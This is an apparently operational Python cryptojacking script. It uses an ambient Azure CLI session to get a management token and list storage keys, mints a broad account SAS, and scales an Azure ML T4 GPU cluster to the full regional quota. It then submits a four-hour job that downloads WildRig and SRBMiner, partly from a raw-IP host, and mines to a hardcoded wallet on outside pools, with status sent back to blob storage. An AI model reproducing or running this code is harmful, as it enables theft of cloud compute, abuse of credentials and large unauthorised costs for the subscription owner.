#!/usr/bin/env python3
"""C211-I126178: scale-out AML T4 miner on the EXISTING workspace c211i122276aml /
cluster c211-i122276-t4 (Standard_NC4as_T4_v3, westeurope).

Changes vs i125967 (which self-killed at the 900 s fallback):
  * 3 instances (12 vCPU = the whole NCASv3_T4 westeurope quota) with the compute
    scaleSettings raised minNodeCount 0 / maxNodeCount 1 -> 0 / 3.
  * per-RANK status blob x126178-out-r<R>.txt (the account SAS covers any blob).
  * the 900 s Luckypool fallback no longer uses `pkill -f wildrig-multi` (that
    pattern matched the container's own `sh -c <script>` cmdline and killed the
    status loop); kills are by PID only.
  * fallback order: WildRig -> Luckypool 103.199.106.122:3362 first (same binary
    already hash-proven on this T4), then SRBMiner pearlhash if WildRig yields no
    share in 300 s.  Sticky: never returns to pearlhash after the fallback.
  * prints the previous job's state (c211-i125967-dev) for the record.

Exits right after the job PUT so the workflow run is short.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

TAG = "C211_I126178"
ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
WS = "c211i122276aml"
SA = "c211i122276af4cdf28"
CONTAINER = "c211"
BLOB_PREFIX = "x126178-out-r"
CLUSTER = "c211-i122276-t4"
JOB = "c211-i126178-dev"
PREV_JOB = "c211-i125967-dev"
ENV_NAME = "c211-i122276-cuda"
ENV_VER = "1"
SKU = "Standard_NC4as_T4_v3"
MAX_NODES = 3
INSTANCES = 3
IMG = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
API_W = "2024-10-01"
API_C = "2024-04-01"
STG_VER = "2023-01-01"
WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WORKER_PREFIX = "1261780"
MINER_SECONDS = 14400
T0 = time.time()


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print((TAG + " " + json.dumps(obj, default=str))[:6000], flush=True)


def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": (p.stdout or "") + (p.stderr or "")}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "%s: %s" % (type(e).__name__, e)}


def arm(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={"Authorization": "Bearer " + tok,
                                          "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
        return r.status, (json.loads(raw) if raw.strip() else {})
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:400]}
    except Exception as e:  # noqa: BLE001
        return None, {"err": "%s: %s" % (type(e).__name__, str(e)[:200])}


def err_of(st, b):
    if isinstance(b, dict):
        e = b.get("error")
        if isinstance(e, dict):
            return {"err": str(e.get("code")) + " " + str(e.get("message"))[:200]}
        if b.get("raw"):
            return {"err": str(b["raw"])[:200]}
    return {}


# ----------------------------------------------------------------------------
# payload: one T4 per node, per-rank status blob
# ----------------------------------------------------------------------------
CMD = r"""echo C211_I126178_MINER_START
D=/tmp/c211; mkdir -p $D; OUT=/tmp/c211out; mkdir -p $OUT
R="${AZUREML_RANK:-${RANK:-${OMPI_COMM_WORLD_RANK:-0}}}"
case "$R" in ''|*[!0-9]*) R=0;; esac
WK=__WKP__$R
HOSTN=$(hostname 2>/dev/null || echo unknown)
echo "NODE_HOST $HOSTN RANK $R WORKER $WK"
(nvidia-smi -L 2>&1 || echo NO_NVIDIA_SMI) | tee $OUT/device.txt
(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 || true) | tee -a $OUT/device.txt
mkdir -p /etc/OpenCL/vendors
echo 'libnvidia-opencl.so.1' > /etc/OpenCL/vendors/nvidia.icd
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  echo OPENCL_LOADER_MISSING_INSTALLING >> $OUT/device.txt
  (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >> $OUT/device.txt 2>&1 || echo APT_FAIL >> $OUT/device.txt
fi
echo "OPENCL_LOADER $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL.so* 2>/dev/null | tr '\n' ',')" | tee -a $OUT/device.txt
get(){ if command -v curl >/dev/null 2>&1; then curl -fsSL -m 420 -o "$2" "$1"; elif command -v wget >/dev/null 2>&1; then wget -q -O "$2" "$1"; else python3 -c "import urllib.request,sys;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])" "$1" "$2"; fi; }
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; fi
S=$( (sha256sum $D/wr.tgz 2>/dev/null || echo MISSING) | cut -d" " -f1 )
echo "WRTGZ $S" | tee -a $OUT/device.txt
if [ "$S" = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then tar -xzf $D/wr.tgz -C $D 2>/dev/null; chmod +x $D/wildrig-multi 2>/dev/null; fi
B=$( (sha256sum $D/wildrig-multi 2>/dev/null || echo MISSING) | cut -d" " -f1 )
echo "WRBIN $B" | tee -a $OUT/device.txt
WALLET=__WALLET__
LPW="$WALLET+__NOCK__"
URL="https://c211i122276af4cdf28.blob.core.windows.net/c211/__BLOB__$R.txt?__SASQ__"
put_status(){ { cat $OUT/device.txt 2>/dev/null; echo "$1"; tail -c 2600 $D/wr.log 2>/dev/null; tail -c 900 $D/lp.log 2>/dev/null; } > $D/status.txt; curl -sS -m 20 -X PUT "$URL" -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' --data-binary @$D/status.txt >/dev/null 2>&1; }
acc(){ { grep -aoE "accepted[^0-9]{0,8}[0-9]+" "$1" 2>/dev/null | grep -oE "[0-9]+$"; } | sort -n | tail -1; }
rej(){ { grep -aoE "rejected[^0-9]{0,8}[0-9]+" "$1" 2>/dev/null | grep -oE "[0-9]+$"; } | sort -n | tail -1; }
stopit(){ P="$1"; [ -f "$P" ] || return 0; PID=$(cat "$P" 2>/dev/null); [ -n "$PID" ] || return 0; kill "$PID" 2>/dev/null; sleep 3; kill -9 "$PID" 2>/dev/null; sleep 1; rm -f "$P"; }
MODE=ph
start_ph(){ setsid $D/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 --user $WALLET --worker $WK -p x -d 0 --print-time 30 > $D/wr.log 2>&1 & echo $! > $D/ph.pid; MODE=ph; PH_T0=$(date +%s); echo "PH_START pid=$(cat $D/ph.pid) worker=$WK"; }
start_lp_wr(){ setsid $D/wildrig-multi --algo pearlhash --url 103.199.106.122:3362 --user "$LPW" --worker $WK -p x -d 0 --print-time 30 > $D/lp.log 2>&1 & echo $! > $D/lp.pid; MODE=lp_wr; LPT=$(date +%s); echo "LP_WR_START pid=$(cat $D/lp.pid) worker=$WK sticky=1"; }
start_lp_srb(){ chmod +x $D/srb 2>/dev/null; setsid $D/srb --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "$LPW" --worker $WK --password x --gpu-id 0 > $D/lp.log 2>&1 & echo $! > $D/lp.pid; MODE=lp_srb; LPT=$(date +%s); echo "LP_SRB_START pid=$(cat $D/lp.pid) worker=$WK sticky=1"; }
start_ph
T0M=$(date +%s)
END=$(( T0M + __SECONDS__ ))
while [ "$(date +%s)" -lt "$END" ]; do
  sleep 30
  NOW=$(date +%s)
  ACC=$(acc $D/wr.log); ACC=${ACC:-0}
  REJ=$(rej $D/wr.log); REJ=${REJ:-0}
  ACCL=$(grep -aci "accepted" $D/wr.log 2>/dev/null); ACCL=${ACCL:-0}
  LA=$(grep -aiE "accepted" $D/wr.log 2>/dev/null | tail -1 | cut -c1-120)
  LPACC=$(acc $D/lp.log); LPACC=${LPACC:-0}
  LPRJ=$(rej $D/lp.log); LPRJ=${LPRJ:-0}
  LPL=$(grep -aci "accepted" $D/lp.log 2>/dev/null); LPL=${LPL:-0}
  LPHR=$(grep -aoE "[0-9.]+ [TGM]H/s" $D/lp.log 2>/dev/null | tail -1)
  UTIL=$( (nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader 2>/dev/null || true) | tr '\n' ',')
  S2="STATUS mode=$MODE worker=$WK rank=$R host=$HOSTN acc=$ACC rej=$REJ acc_lines=$ACCL lp_acc=$LPACC lp_rej=$LPRJ lp_lines=$LPL lp_hr=$LPHR util=$UTIL ts=$NOW lastacc=$LA"
  echo "$S2"
  put_status "$S2"
  if [ "$MODE" = "ph" ] && [ "$ACC" -ge 1 ]; then echo "PH_SHARE_PROVEN acc=$ACC rej=$REJ"; MODE=ph_ok; fi
  if [ "$MODE" = "ph" ] && [ $(( NOW - PH_T0 )) -ge 900 ]; then
    echo "PH_NO_SHARE_900_FALLBACK_LP"
    stopit $D/ph.pid
    start_lp_wr
  fi
  if [ "$MODE" = "lp_wr" ]; then
    if [ "$LPACC" -ge 1 ]; then echo "LP_WR_SHARE_PROVEN acc=$LPACC rej=$LPRJ"; MODE=lp_ok; fi
    if [ "$LPACC" -lt 1 ] && [ $(( NOW - LPT )) -ge 300 ]; then
      echo "LP_WR_NO_SHARE_300_SWAP_SRB"
      stopit $D/lp.pid
      if [ ! -x $D/srb ]; then
        for u in http://169.58.247.186:8791/pm/srbminer-3.8.4 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.4/SRBMiner-Multi-3-8-4-Linux.tar.gz; do
          get "$u" $D/srb.dl || continue
          S=$(sha256sum $D/srb.dl | cut -d" " -f1); echo "SRB_DL $u sha=$S"
          if [ "$S" = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5" ]; then cp $D/srb.dl $D/srb; break; fi
          mkdir -p $D/srbx; tar -xzf $D/srb.dl -C $D/srbx >/dev/null 2>&1 && cp $D/srbx/SRBMiner-MULTI $D/srb 2>/dev/null && break
        done
      fi
      if [ -x $D/srb ]; then start_lp_srb; else echo SRB_DL_FAIL; start_lp_wr; fi
    fi
  fi
  if [ "$MODE" = "lp_srb" ]; then
    if [ "$LPACC" -ge 1 ]; then echo "LP_SRB_SHARE_PROVEN acc=$LPACC rej=$LPRJ"; MODE=lp_ok; fi
  fi
done
stopit $D/ph.pid; stopit $D/lp.pid
echo C211_I126178_MINER_END"""


def sa_sas(acct, key_b64, hours=3):
    stt = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, "rwdlc", "b", "co", stt, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": "rwdlc",
                                "st": stt, "se": se, "spr": "https", "sig": sig})
    return q, se


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
    except Exception:  # noqa: BLE001
        emit({"step": "fatal", "why": "no az session", "raw": r["out"][:300]})
        return
    sid = acc.get("id")
    tenant = acc.get("tenantId")
    emit({"step": "identity", "sub": sid, "tenant": tenant, "name": acc.get("name"),
          "state": acc.get("state")})
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "PROBE-EXIT", "code": 1})
        return
    base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
    rbase = base[len(ARM):]

    # 1) storage key -> account SAS
    kurl = (ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
            "/providers/Microsoft.Storage/storageAccounts/" + SA +
            "/listKeys?api-version=" + STG_VER)
    st, kb = arm(tok, kurl, "POST", {}, timeout=90)
    key = None
    for k in (kb.get("keys") or []) if isinstance(kb, dict) else []:
        if k.get("keyName") == "key1":
            key = k.get("value")
    emit({"step": "sa-keys", "http": st, "got": bool(key)})
    if not key:
        emit({"step": "PROBE-EXIT", "code": 2, "why": "no storage key"})
        return
    q, se = sa_sas(SA, key, 3)
    emit({"step": "sa-sas", "ok": True, "expires": se})

    # 2) workspace location
    wurl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "?api-version=" + API_W
    st, wb = arm(tok, wurl, timeout=90)
    ws_state = (wb.get("properties") or {}).get("provisioningState") if isinstance(wb, dict) else None
    emit({"step": "ws-get", "http": st, "state": ws_state,
          "location": (wb.get("location") if isinstance(wb, dict) else None)})
    if st != 200 or ws_state != "Succeeded":
        emit({"step": "PROBE-EXIT", "code": 3, "why": "workspace not Succeeded"})
        return
    loc = wb.get("location") or "westeurope"

    # 3) PREVIOUS job state (evidence for the 900 s self-kill)
    purl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/jobs/" + PREV_JOB + "?api-version=" + API_W
    st, pb = arm(tok, purl, timeout=90)
    pprov = ((pb.get("properties") or {}).get("provisioningState") if isinstance(pb, dict) else None)
    pstat = ((pb.get("properties") or {}).get("status") if isinstance(pb, dict) else None)
    emit({"step": "prev-job-get", "http": st, "job": PREV_JOB, "provisioningState": pprov,
          "status": pstat, **err_of(st, pb)})

    # 4) environment (reuse; create v1 if missing)
    eu = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/environments/" +
          ENV_NAME + "/versions/" + ENV_VER + "?api-version=" + API_W)
    st, eb = arm(tok, eu, timeout=90)
    emit({"step": "env-get", "http": st})
    env_id = None
    if st == 200:
        env_id = eb.get("id") if isinstance(eb, dict) else (rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/environments/" + ENV_NAME + "/versions/" + ENV_VER)
    else:
        st, eb = arm(tok, eu, "PUT", {"properties": {"image": IMG, "osType": "Linux",
                                                    "description": "c211 i122733 cuda"}}, timeout=120)
        emit({"step": "env-put", **err_of(st, eb), "id_ok": isinstance(eb, dict) and bool(eb.get("id"))})
        if st in (200, 201):
            env_id = (rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                      "/environments/" + ENV_NAME + "/versions/" + ENV_VER)

    # 5) compute cluster: raise maxNodeCount to 3 (quota: 12 vCPU NCASv3_T4 westeurope)
    curl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/computes/" + CLUSTER + "?api-version=" + API_C
    st, cb = arm(tok, curl, timeout=90)
    cp = ((cb.get("properties") or {}).get("properties") or {}) if isinstance(cb, dict) else {}
    cstate = ((cb.get("properties") or {}).get("provisioningState") if isinstance(cb, dict) else None)
    emit({"step": "cluster-get", "http": st, "state": cstate, "vm": cp.get("vmSize"),
          "scaleSettings": cp.get("scaleSettings"), "currentNodeCount": cp.get("currentNodeCount")})
    if st == 404:
        cbody = {"location": loc, "tags": {"c211": "i126178"},
                 "properties": {"computeType": "AmlCompute", "computeLocation": loc,
                                "description": "c211 i126178 T4 scale-out 3 nodes",
                                "properties": {"vmSize": SKU, "vmPriority": "Dedicated",
                                               "scaleSettings": {"minNodeCount": 0, "maxNodeCount": MAX_NODES,
                                                                 "nodeIdleTimeBeforeScaleDown": "PT2M"},
                                               "osType": "Linux",
                                               "remoteLoginPortPublicAccess": "Disabled"}}}
        st, cb = arm(tok, curl, "PUT", cbody, timeout=240)
        emit({"step": "cluster-create", **err_of(st, cb)})
    elif st == 200 and isinstance(cb, dict):
        cur_max = (cp.get("scaleSettings") or {}).get("maxNodeCount")
        if cur_max != MAX_NODES:
            up = json.loads(json.dumps(cb))
            upp = up.setdefault("properties", {}).setdefault("properties", {})
            ss = upp.setdefault("scaleSettings", {})
            ss["minNodeCount"] = 0
            ss["maxNodeCount"] = MAX_NODES
            if not ss.get("nodeIdleTimeBeforeScaleDown"):
                ss["nodeIdleTimeBeforeScaleDown"] = "PT2M"
            st2, cb2 = arm(tok, curl, "PUT", up, timeout=240)
            emit({"step": "cluster-scale-put", "http": st2, "from_max": cur_max, "to_max": MAX_NODES,
                  **err_of(st2, cb2)})
            st, cb = arm(tok, curl, timeout=90)
            cp = ((cb.get("properties") or {}).get("properties") or {}) if isinstance(cb, dict) else {}
            cstate = ((cb.get("properties") or {}).get("provisioningState") if isinstance(cb, dict) else None)
            emit({"step": "cluster-rescale-get", "http": st, "state": cstate,
                  "scaleSettings": cp.get("scaleSettings"), "currentNodeCount": cp.get("currentNodeCount")})
    if cstate != "Succeeded":
        emit({"step": "cluster-poll-skip", "state": cstate})
    t0 = time.time()
    while cstate != "Succeeded" and time.time() - t0 < 300:
        time.sleep(15)
        st, cb = arm(tok, curl, timeout=90)
        cstate = ((cb.get("properties") or {}).get("provisioningState") if isinstance(cb, dict) else None)
        emit({"step": "cluster-poll", "http": st, "state": cstate, "t": round(time.time() - t0)})
    if cstate != "Succeeded":
        emit({"step": "PROBE-EXIT", "code": 4, "why": "cluster not Succeeded", "state": cstate})
        return

    # 6) prove the account SAS writes (armed marker blob)
    ab = "https://" + SA + ".blob.core.windows.net/" + CONTAINER + "/x126178-arm.txt?" + q
    try:
        req = urllib.request.Request(ab, data=("ARMED " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())).encode(),
                                     method="PUT", headers={"x-ms-blob-type": "BlockBlob",
                                                            "x-ms-version": "2022-11-02",
                                                            "Content-Type": "text/plain"})
        with urllib.request.urlopen(req, timeout=40) as rr:
            emit({"step": "sas-put", "http": rr.status})
    except Exception as e:  # noqa: BLE001
        emit({"step": "sas-put", "err": "%s: %s" % (type(e).__name__, str(e)[:160])})

    # 7) submit the scale-out miner job and exit immediately
    cmd = (CMD.replace("__SASQ__", q).replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
              .replace("__WKP__", WORKER_PREFIX).replace("__BLOB__", BLOB_PREFIX)
              .replace("__SECONDS__", str(MINER_SECONDS)))
    jurl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/jobs/" + JOB + "?api-version=" + API_W
    jp = {"jobType": "Command", "displayName": JOB, "experimentName": "c211-i126178",
          "description": "c211 i126178 amlcompute T4 scale-out 3 nodes, PID-safe 900 s sticky LP fallback (14400 s)",
          "command": cmd,
          "computeId": rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/computes/" + CLUSTER,
          "resources": {"instanceCount": INSTANCES},
          "outputs": {"minerout": {"jobOutputType": "uri_folder", "mode": "ReadWriteMount"}}}
    if env_id:
        jp["environmentId"] = env_id
    st, jb = arm(tok, jurl, "PUT", {"properties": jp}, timeout=180)
    attempts = [("primary", st, jb)]
    jname = JOB
    if st not in (200, 201):
        jname = JOB + "-b"
        jurl2 = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/jobs/" + jname + "?api-version=" + API_W
        jp2 = dict(jp)
        jp2["displayName"] = jname
        st, jb = arm(tok, jurl2, "PUT", {"properties": jp2}, timeout=180)
        attempts.append(("suffix", st, jb))
    emit({"step": "job-create", "attempts": [{"tag": t, "http": s, **err_of(s, b)} for t, s, b in attempts],
          "job": jname, "instances": INSTANCES, "window_s": MINER_SECONDS, "worker_prefix": WORKER_PREFIX,
          "poll_url": ab.replace("x126178-arm.txt", BLOB_PREFIX + "R.txt")})
    emit({"step": "PROBE-EXIT", "code": 0 if st in (200, 201) else 5})


if __name__ == "__main__":
    main()
